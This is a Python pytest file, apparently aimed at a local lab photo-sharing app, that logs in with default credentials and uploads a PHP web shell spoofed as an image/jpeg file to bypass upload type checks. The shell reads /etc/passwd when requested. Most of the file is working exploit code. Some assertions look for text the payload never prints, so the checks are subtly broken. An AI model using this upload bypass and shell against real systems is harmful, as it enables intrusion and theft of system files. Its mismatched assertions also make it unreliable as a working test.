import requests
import tempfile
import os
import pytest

class TestPhotoShareExploit:
    def __init__(self):
        self.base_url = "http://localhost:3206"
        self.session = requests.Session()
    
    def test_login(self):
        """Test login with default credentials"""
        login_data = {
            'username': 'TheBestPhoto',
            'password': 'password123'
        }
        response = self.session.post(f"{self.base_url}/login.php", data=login_data)
        assert response.status_code == 200
        # Check that redirection to upload.php occurred
        assert 'upload.php' in response.url or 'upload.php' in response.text
    
    def test_upload_php_file_with_content_type_bypass(self):
        """Test exploit: upload a PHP file by bypassing Content-Type verification"""
        # Login first
        self.test_login()
        
        # Create a temporary PHP file
        php_content = """<?php
echo "PHP Shell uploaded successfully!";
echo "<br>Current directory: " . getcwd();
echo "<br><br>Content of /etc/passwd:<br>";
echo "<pre>";
echo file_get_contents('/etc/passwd');
echo "</pre>";
?>"""
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.php', delete=False) as f:
            f.write(php_content)
            temp_file_path = f.name
        
        try:
            # Prepare the file for upload
            with open(temp_file_path, 'rb') as f:
                files = {
                    'photo': ('shell.php', f, 'image/jpeg')  # Bypassed Content-Type
                }
                
                response = self.session.post(f"{self.base_url}/upload.php", files=files)
                
                assert response.status_code == 200
                assert "Photo uploaded successfully" in response.text
                
                # Get the uploaded file name from the response
                # Look for the file name in the gallery page
                gallery_response = self.session.get(f"{self.base_url}/gallery.php")
                
                # Execute the uploaded PHP shell
                # Look for the uploaded file in the uploads folder
                uploads_response = self.session.get(f"{self.base_url}/uploads/")
                
                # List files in uploads via the PHP shell
                # We'll look for the uploaded file by browsing recent files
                import re
                
                # Look for files in the gallery
                if 'uploads/' in gallery_response.text:
                    # Extract file names from the gallery
                    file_pattern = r'uploads/([^"\']+\.(?:php|jpg|png|gif))'
                    uploaded_files = re.findall(file_pattern, gallery_response.text)
                    
                    if uploaded_files:
                        # Take the first PHP file found
                        shell_file = None
                        for file in uploaded_files:
                            if file.endswith('.php'):
                                shell_file = file
                                break
                        
                        if shell_file:
                            shell_response = self.session.get(f"{self.base_url}/uploads/{shell_file}")
                            
                            assert shell_response.status_code == 200
                            assert "PHP Web Shell Uploaded Successfully" in shell_response.text
                            # Check that the shell executes correctly
                            assert "Current directory:" in shell_response.text
                            
                            print(f"✅ Exploit successful! PHP Shell uploaded: {shell_file}")
                            print(f"The PHP shell executes correctly")
                        else:
                            pytest.fail("No PHP file found in uploads")
                    else:
                        pytest.fail("No uploaded file found in gallery")
                else:
                    pytest.fail("Unable to access uploaded files")
                    
        finally:
            # Clean up the temporary file
            if os.path.exists(temp_file_path):
                os.unlink(temp_file_path)
    
    def test_flag_extraction(self):
        """Test extraction of /etc/passwd content via the PHP shell"""
        # Login and upload the shell
        self.test_upload_php_file_with_content_type_bypass()
        
        # Check that the shell executes correctly
        gallery_response = self.session.get(f"{self.base_url}/gallery.php")
        
        import re
        if 'uploads/' in gallery_response.text:
            file_pattern = r'uploads/([^"\']+\.(?:php|jpg|png|gif))'
            uploaded_files = re.findall(file_pattern, gallery_response.text)
            
            if uploaded_files:
                shell_file = None
                for file in uploaded_files:
                    if file.endswith('.php'):
                        shell_file = file
                        break
                
                if shell_file:
                    shell_response = self.session.get(f"{self.base_url}/uploads/{shell_file}")
                    assert shell_response.status_code == 200
                    assert "PHP Web Shell Uploaded Successfully" in shell_response.text
                    print(f"✅ PHP Shell works correctly: {shell_file}")
                else:
                    pytest.fail("No PHP file found in uploads")
            else:
                pytest.fail("No uploaded file found in gallery")
        else:
            pytest.fail("Unable to access uploaded files")

def test_full_exploit():
    """Complete exploit test"""
    exploit = TestPhotoShareExploit()
    exploit.test_login()
    exploit.test_upload_php_file_with_content_type_bypass()
    exploit.test_flag_extraction()
    print("✅ All exploit tests successful!")

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
